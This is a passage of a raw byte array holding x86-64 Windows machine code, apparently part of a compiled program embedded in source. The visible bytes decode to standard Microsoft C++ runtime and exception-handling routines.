0x0, 0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xf9, 0x4c, 0x8d, 0x3d, 0xa3, 0xcd, 0xff, 0xff, 0x49, 0x83, 0xce, 0xff, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xea, 0x49, 0x8b, 0x84, 0xff, 0x58, 0x9d, 0x1, 0x0, 0x90, 0x49, 0x3b, 0xc6, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x85, 0xe4, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xc1, 0xf, 0x84, 0xd1, 0x0, 0x0, 0x0, 0x8b, 0x75, 0x0, 0x49, 0x8b, 0x9c, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x90, 0x48, 0x85, 0xdb, 0x74, 0xb, 0x49, 0x3b, 0xde, 0xf, 0x85, 0x99, 0x0, 0x0, 0x0, 0xeb, 0x6b, 0x4d, 0x8b, 0xbc, 0xf7, 0xd8, 0x1, 0x1, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0x41, 0xb8, 0x0, 0x8, 0x0, 0x0, 0xff, 0x15, 0x8d, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x56, 0xff, 0x15, 0x1f, 0xbe, 0x0, 0x0, 0x83, 0xf8, 0x57, 0x75, 0x2d, 0x44, 0x8d, 0x43, 0x7, 0x49, 0x8b, 0xcf, 0x48, 0x8d, 0x15, 0xa4, 0xcf, 0x0, 0x0, 0xe8, 0x9f, 0x2b, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x16, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0xff, 0x15, 0x55, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x1e, 0x49, 0x8b, 0xc6, 0x4c, 0x8d, 0x3d, 0xf3, 0xcc, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x48, 0x83, 0xc5, 0x4, 0x49, 0x3b, 0xec, 0xe9, 0x67, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x4c, 0x8d, 0x3d, 0xd5, 0xcc, 0xff, 0xff, 0x49, 0x87, 0x84, 0xf7, 0x40, 0x9d, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x9, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xff, 0xbd, 0x0, 0x0, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xfb, 0xbd, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd, 0x48, 0x8b, 0xc8, 0x49, 0x87, 0x8c, 0xff, 0x58, 0x9d, 0x1, 0x0, 0xeb, 0xa, 0x4d, 0x87, 0xb4, 0xff, 0x58, 0x9d, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0x8, 0xcf, 0x0, 0x0, 0x33, 0xc9, 0x4c, 0x8d, 0x5, 0xf7, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xf8, 0xce, 0x0, 0x0, 0xe8, 0x8b, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0xf, 0x48, 0x8b, 0xcb, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xff, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x53, 0xbd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0xd9, 0xce, 0x0, 0x0, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xc5, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xc6, 0xce, 0x0, 0x0, 0xe8, 0x41, 0xfe, 0xff, 0xff, 0x8b, 0xcb, 0x48, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xb6, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x22, 0xbd, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x4c, 0x8d, 0xd, 0xa1, 0xce, 0x0, 0x0, 0xb9, 0x2, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x8d, 0xce, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x8e, 0xce, 0x0, 0x0, 0xe8, 0xf9, 0xfd, 0xff, 0xff, 0x8b, 0xcb, 0x48, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x6e, 0xbe, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xca, 0xbc, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x4c, 0x8d, 0xd, 0x6c, 0xce, 0x0, 0x0, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x63, 0xce, 0x0, 0x0, 0xb9, 0x3, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x4f, 0xce, 0x0, 0x0, 0xe8, 0xaa, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0xd3, 0x8b, 0xcf, 0x48, 0x85, 0xc0, 0x74, 0x8, 0xff, 0x15, 0x22, 0xbe, 0x0, 0x0, 0xeb, 0x6, 0xff, 0x15, 0x8a, 0xbc, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf0, 0x4c, 0x8d, 0xd, 0x2b, 0xce, 0x0, 0x0, 0x8b, 0xda, 0x4c, 0x8d, 0x5, 0x1a, 0xce, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x18, 0xce, 0x0, 0x0, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x4e, 0xfd, 0xff, 0xff, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0x48, 0x85, 0xc0, 0x74, 0xb, 0x44, 0x8b, 0xc6, 0xff, 0x15, 0xc3, 0xbd, 0x0, 0x0, 0xeb, 0x6, 0xff, 0x15, 0x13, 0xbc, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x4d, 0x63, 0x48, 0x1c, 0x4d, 0x8b, 0xd0, 0x48, 0x8b, 0x1, 0x41, 0x8b, 0x4, 0x1, 0x83, 0xf8, 0xfe, 0x75, 0xb, 0x4c, 0x8b, 0x2, 0x49, 0x8b, 0xca, 0xe8, 0x82, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x49, 0x8b, 0xd8, 0xe8, 0x65, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x8, 0x48, 0x63, 0x43, 0x1c, 0x48, 0x89, 0x4c, 0x24, 0x40, 0x8b, 0x44, 0x8, 0x4, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x63, 0x52, 0x1c, 0x48, 0x8b, 0x1, 0x44, 0x89, 0x4, 0x2, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0xe8, 0x26, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x8, 0x48, 0x63, 0x43, 0x1c, 0x48, 0x89, 0x4c, 0x24, 0x40, 0x3b, 0x7c, 0x8, 0x4, 0x7e, 0x4, 0x89, 0x7c, 0x8, 0x4, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0x4c, 0x8b, 0x2, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x52, 0x4c, 0x63, 0x59, 0x18, 0x4c, 0x8b, 0x52, 0x8, 0x4b, 0x8d, 0x4, 0x13, 0x48, 0x85, 0xc0, 0x74, 0x41, 0x44, 0x8b, 0x41, 0x14, 0x45, 0x33, 0xc9, 0x45, 0x85, 0xc0, 0x74, 0x30, 0x4b, 0x8d, 0xc, 0xcb, 0x4a, 0x63, 0x14, 0x11, 0x49, 0x3, 0xd2, 0x48, 0x3b, 0xda, 0x72, 0x8, 0x41, 0xff, 0xc1, 0x45, 0x3b, 0xc8, 0x72, 0xe8, 0x45, 0x85, 0xc9, 0x74, 0x13, 0x41, 0x8d, 0x49, 0xff, 0x49, 0x8d, 0x4, 0xcb, 0x42, 0x8b, 0x44, 0x10, 0x4, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x83, 0xc8, 0xff, 0xeb, 0xf5, 0xe8, 0x83, 0x26, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x4d, 0x8b, 0xf1, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xf2, 0x4c, 0x8b, 0xe9, 0x33, 0xff, 0x41, 0x39, 0x78, 0x4, 0x74, 0xf, 0x4d, 0x63, 0x78, 0x4, 0xe8, 0xfe, 0xfa, 0xff, 0xff, 0x49, 0x8d, 0x14, 0x7, 0xeb, 0x6, 0x48, 0x8b, 0xd7, 0x44, 0x8b, 0xff, 0x48, 0x85, 0xd2, 0xf, 0x84, 0x77, 0x1, 0x0, 0x0, 0x45, 0x85, 0xff, 0x74, 0x11, 0xe8, 0xdf, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x63, 0x43, 0x4, 0x48, 0x3, 0xc8, 0xeb, 0x3, 0x48, 0x8b, 0xcf, 0x40, 0x38, 0x79, 0x10, 0xf, 0x84, 0x54, 0x1, 0x0, 0x0, 0x39, 0x7b, 0x8, 0x75, 0x8, 0x39, 0x3b, 0xf, 0x8d, 0x47, 0x1, 0x0, 0x0, 0x39, 0x3b, 0x7c, 0xa, 0x48, 0x63, 0x43, 0x8, 0x48, 0x3, 0x6, 0x48, 0x8b, 0xf0, 0xf6, 0x3, 0x80, 0x74, 0x32, 0x41, 0xf6, 0x6, 0x10, 0x74, 0x2c, 0x48, 0x8b, 0x5, 0x61, 0x65, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x20, 0xff, 0x15, 0xf6, 0xbb, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x2f, 0x1, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x26, 0x1, 0x0, 0x0, 0x48, 0x89, 0x6, 0x48, 0x8b, 0xc8, 0xeb, 0x5f, 0xf6, 0x3, 0x8, 0x74, 0x1b, 0x49, 0x8b, 0x4d, 0x28, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x11, 0x1, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x8, 0x1, 0x0, 0x0, 0x48, 0x89, 0xe, 0xeb, 0x3f, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x4a, 0x49, 0x8b, 0x55, 0x28, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xf5, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0xec, 0x0, 0x0, 0x0, 0x4d, 0x63, 0x46, 0x14, 0x48, 0x8b, 0xce, 0xe8, 0x64, 0xe6, 0xff, 0xff, 0x41, 0x83, 0x7e, 0x14, 0x8, 0xf, 0x85, 0xab, 0x0, 0x0, 0x0, 0x48, 0x39, 0x3e, 0xf, 0x84, 0xa2, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xe, 0x49, 0x8d, 0x56, 0x8, 0xe8, 0x3c, 0xf0, 0xff, 0xff, 0x48, 0x89, 0x6, 0xe9, 0x8e, 0x0, 0x0, 0x0, 0x41, 0x39, 0x7e, 0x18, 0x74, 0xf, 0x49, 0x63, 0x5e, 0x18, 0xe8, 0x9, 0xfa, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x3, 0xeb, 0x5, 0x48, 0x8b, 0xcf, 0x8b, 0xdf, 0x48, 0x85, 0xc9, 0x75, 0x34, 0x49, 0x39, 0x7d, 0x28, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x8b, 0x0, 0x0, 0x0, 0x49, 0x63, 0x5e, 0x14, 0x49, 0x8d, 0x56, 0x8, 0x49, 0x8b, 0x4d, 0x28, 0xe8, 0xf1, 0xef, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xce, 0xe8, 0xeb, 0xe5, 0xff, 0xff, 0xeb, 0x3b, 0x49, 0x39, 0x7d, 0x28, 0x74, 0x69, 0x48, 0x85, 0xf6, 0x74, 0x64, 0x85, 0xdb, 0x74, 0x11, 0xe8, 0xb1, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x49, 0x63, 0x46, 0x18, 0x48, 0x3, 0xc8, 0xeb, 0x3, 0x48, 0x8b, 0xcf, 0x48, 0x85, 0xc9, 0x74, 0x47, 0x41, 0x8a, 0x6, 0x24, 0x4, 0xf6, 0xd8, 0x1b, 0xc9, 0xf7, 0xd9, 0xff, 0xc1, 0x8b, 0xf9, 0x89, 0x4c, 0x24, 0x20, 0x8b, 0xc7, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x58, 0x48, 0x8b, 0x7c, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0xc3, 0xe8, 0x9d, 0x24, 0x0, 0x0, 0xe8, 0x98, 0x24, 0x0, 0x0, 0xe8, 0x93, 0x24, 0x0, 0x0, 0xe8, 0x8e, 0x24, 0x0, 0x0, 0xe8, 0x89, 0x24, 0x0, 0x0, 0x90, 0xe8, 0x83, 0x24, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x4c, 0x8b, 0xf1, 0x33, 0xdb, 0x41, 0x39, 0x18, 0x7d, 0x5, 0x48, 0x8b, 0xf2, 0xeb, 0x7, 0x49, 0x63, 0x70, 0x8, 0x48, 0x3, 0x32, 0xe8, 0xcd, 0xfd, 0xff, 0xff, 0x83, 0xe8, 0x1, 0x74, 0x3c, 0x83, 0xf8, 0x1, 0x75, 0x67, 0x48, 0x8d, 0x57, 0x8, 0x49, 0x8b, 0x4e, 0x28, 0xe8, 0x1a, 0xef, 0xff, 0xff, 0x4c, 0x8b, 0xf0, 0x39, 0x5f, 0x18, 0x74, 0xc, 0xe8, 0xf1, 0xf8, 0xff, 0xff, 0x48, 0x63, 0x5f, 0x18, 0x48, 0x3, 0xd8, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0xe8, 0x7e, 0x12, 0x0, 0x0, 0xeb, 0x30, 0x48, 0x8d, 0x57, 0x8, 0x49, 0x8b, 0x4e, 0x28, 0xe8, 0xe3, 0xee, 0xff, 0xff, 0x4c, 0x8b, 0xf0, 0x39, 0x5f, 0x18, 0x74, 0xc, 0xe8, 0xba, 0xf8, 0xff, 0xff, 0x48, 0x63, 0x5f, 0x18, 0x48, 0x3, 0xd8, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xce, 0xe8, 0x41, 0x12, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xe8, 0xc1, 0x23, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x4c, 0x89, 0x40, 0x18, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x4c, 0x8b, 0xac, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xf9, 0x4c, 0x8b, 0xe2, 0x4c, 0x8d, 0x48, 0x10, 0x48, 0x8b, 0xe9, 0x4d, 0x8b, 0xc5, 0x49, 0x8b, 0xd7, 0x49, 0x8b, 0xcc, 0xe8, 0x97, 0xf4, 0xff, 0xff, 0x4c, 0x8b, 0x8c, 0x24, 0xd0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xf0, 0x48, 0x8b, 0xb4, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x4d, 0x85, 0xc9, 0x74, 0xe, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcd, 0xe8, 0xdd, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x8c, 0x24, 0xd8, 0x0, 0x0, 0x0, 0x8b, 0x59, 0x8, 0x8b, 0x39, 0xe8, 0xff, 0xf7, 0xff, 0xff, 0x48, 0x63, 0x4e, 0xc, 0x4d, 0x8b, 0xce, 0x4c, 0x8b, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x48, 0x3, 0xc1, 0x8a, 0x8c, 0x24, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x88, 0x4c, 0x24, 0x50, 0x49, 0x8b, 0xcc, 0x4c, 0x89, 0x7c, 0x24, 0x48, 0x48, 0x89, 0x74, 0x24, 0x40, 0x89, 0x5c, 0x24, 0x38, 0x89, 0x7c, 0x24, 0x30, 0x4c, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x27, 0xf6, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x60, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0xd8, 0x48, 0x81, 0xec, 0x28, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x68, 0x57, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x10, 0x48, 0x8b, 0xbd, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xe2, 0x4c, 0x8b, 0xad, 0xa8, 0x0, 0x0, 0x0, 0x4d, 0x8b, 0xf8, 0x4c, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x55, 0x80, 0x4c, 0x8b, 0xc7, 0x49, 0x8b, 0xcc, 0x4c, 0x89, 0x6d, 0x98, 0x49, 0x8b, 0xd1, 0xc6, 0x44, 0x24, 0x60, 0x0, 0x49, 0x8b, 0xf1, 0xe8, 0xdf, 0xe, 0x0, 0x0, 0x44, 0x8b, 0xf0, 0x83, 0xf8, 0xff, 0xf, 0x8c, 0x52, 0x4, 0x0, 0x0, 0x3b, 0x47, 0x4, 0xf, 0x8d, 0x49, 0x4, 0x0, 0x0, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x85, 0xc9, 0x0, 0x0, 0x0, 0x83, 0x7b, 0x18, 0x4, 0xf, 0x85, 0xbf, 0x0, 0x0, 0x0, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0xf, 0x87, 0xae, 0x0, 0x0, 0x0, 0x48, 0x83, 0x7b, 0x30, 0x0, 0xf, 0x85, 0xa3, 0x0, 0x0, 0x0, 0xe8, 0x67, 0xf0, 0xff, 0xff, 0x48, 0x83, 0x78, 0x20, 0x0, 0xf, 0x84, 0xa0, 0x3, 0x0, 0x0, 0xe8, 0x57, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0x58, 0x20, 0xe8, 0x4e, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x38, 0xc6, 0x44, 0x24, 0x60, 0x1, 0x4c, 0x8b, 0x78, 0x28, 0x4c, 0x89, 0x7c, 0x24, 0x68, 0xe8, 0x3, 0xf7, 0xff, 0xff, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x1e, 0x83, 0x7b, 0x18, 0x4, 0x75, 0x18, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0xb, 0x48, 0x83, 0x7b, 0x30, 0x0, 0xf, 0x84, 0xbc, 0x3, 0x0, 0x0, 0xe8, 0xc, 0xf0, 0xff, 0xff, 0x48, 0x83, 0x78, 0x38, 0x0, 0x74, 0x3c, 0xe8, 0x0, 0xf0, 0xff, 0xff, 0x4c, 0x8b, 0x78, 0x38, 0xe8, 0xf7, 0xef, 0xff, 0xff, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0x48, 0x83, 0x60, 0x38, 0x0, 0xe8, 0xab, 0xe, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x15, 0x49, 0x8b, 0xcf, 0xe8, 0x8f, 0xf, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x84, 0x5b, 0x3, 0x0, 0x0, 0xe9, 0x32, 0x3, 0x0, 0x0, 0x4c, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x8b, 0x46, 0x8, 0x48, 0x89, 0x45, 0xc0, 0x48, 0x89, 0x7d, 0xb8, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x85, 0xac, 0x2, 0x0, 0x0, 0x83, 0x7b, 0x18, 0x4, 0xf, 0x85, 0xa2, 0x2, 0x0, 0x0, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0xf, 0x87, 0x91, 0x2, 0x0, 0x0, 0x45, 0x33, 0xed, 0x44, 0x39, 0x6f, 0xc, 0xf, 0x86, 0xb5, 0x1, 0x0, 0x0, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0xb8, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x4d, 0xd8, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x45, 0x8b, 0xc6, 0xe8, 0x1f, 0xf3, 0xff, 0xff, 0xf, 0x10, 0x45, 0xd8, 0xf3, 0xf, 0x7f, 0x45, 0xc8, 0x66, 0xf, 0x73, 0xd8, 0x8, 0x66, 0xf, 0x7e, 0xc0, 0x3b, 0x45, 0xf0, 0xf, 0x83, 0x78, 0x1, 0x0, 0x0, 0x4c, 0x8b, 0x4d, 0xd8, 0x44, 0x8b, 0x65, 0xd0, 0x4c, 0x89, 0x4c, 0x24, 0x78, 0x48, 0x8b, 0x45, 0xc8, 0x48, 0x8b, 0x0, 0x48, 0x63, 0x50, 0x10, 0x41, 0x8b, 0xc4, 0x48, 0x8d, 0xc, 0x80, 0x49, 0x8b, 0x41, 0x8, 0x4c, 0x8d, 0x4, 0x8a, 0x41, 0xf, 0x10, 0x4, 0x0, 0x49, 0x63, 0x4c, 0x0, 0x10, 0x89, 0x4d, 0xb0, 0x66, 0xf, 0x7e, 0xc0, 0xf, 0x11, 0x45, 0xa0, 0x41, 0x3b, 0xc6, 0xf, 0x8f, 0x22, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xa0, 0x48, 0xc1, 0xe8, 0x20, 0x44, 0x3b, 0xf0, 0xf, 0x8f, 0x11, 0x1, 0x0, 0x0, 0x4c, 0x8b, 0x7d, 0xa8, 0x48, 0x8b, 0xd1, 0x48, 0x3, 0x56, 0x8, 0x49, 0xc1, 0xef, 0x20, 0x48, 0x89, 0x55, 0x90, 0x45, 0x85, 0xff, 0xf, 0x84, 0xf2, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc5, 0x48, 0x8d, 0xc, 0x80, 0xf, 0x10, 0x4, 0x8a, 0xf, 0x11, 0x45, 0xf8, 0x8b, 0x44, 0x8a, 0x10, 0x89, 0x45, 0x8, 0xe8, 0x5f, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x83, 0xc0, 0x4, 0x48, 0x63, 0x51, 0xc, 0x48, 0x3, 0xc2, 0x48, 0x89, 0x44, 0x24, 0x70, 0xe8, 0x46, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x63, 0x51, 0xc, 0x8b, 0xc, 0x10, 0x89, 0x4c, 0x24, 0x64, 0x85, 0xc9, 0x7e, 0x3c, 0xe8, 0x2e, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x70, 0x4c, 0x8b, 0x43, 0x30, 0x48, 0x63, 0x9, 0x48, 0x3, 0xc1, 0x48, 0x8d, 0x4d, 0xf8, 0x48, 0x8b, 0xd0, 0x48, 0x89, 0x45, 0x88, 0xe8, 0x3b, 0x4, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x25, 0x8b, 0x44, 0x24, 0x64, 0x48, 0x83, 0x44, 0x24, 0x70, 0x4, 0xff, 0xc8, 0x89, 0x44, 0x24, 0x64, 0x85, 0xc0, 0x7f, 0xc4, 0x41, 0xff, 0xc5, 0x45, 0x3b, 0xef, 0x74, 0x62, 0x48, 0x8b, 0x55, 0x90, 0xe9, 0x6c, 0xff, 0xff, 0xff, 0x8a, 0x85, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x55, 0x80, 0x88, 0x44, 0x24, 0x58, 0x8a, 0x44, 0x24, 0x60, 0x88, 0x44, 0x24, 0x50, 0x48, 0x8b, 0x45, 0x98, 0x48, 0x89, 0x44, 0x24, 0x48, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x45, 0xa0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x45, 0x88, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x45, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x5, 0xfc, 0xff, 0xff, 0x4c, 0x8b, 0x4c, 0x24, 0x78, 0x45, 0x33, 0xed, 0x41, 0xff, 0xc4, 0x44, 0x3b, 0x65, 0xf0, 0xf, 0x82, 0x99, 0xfe, 0xff, 0xff, 0x4c, 0x8b, 0x65, 0x80, 0x8b, 0x7, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x21, 0x5, 0x93, 0x19, 0xf, 0x82, 0xfa, 0x0, 0x0, 0x0, 0x44, 0x39, 0x6f, 0x20, 0x74, 0xe, 0xe8, 0x43, 0xf4, 0xff, 0xff, 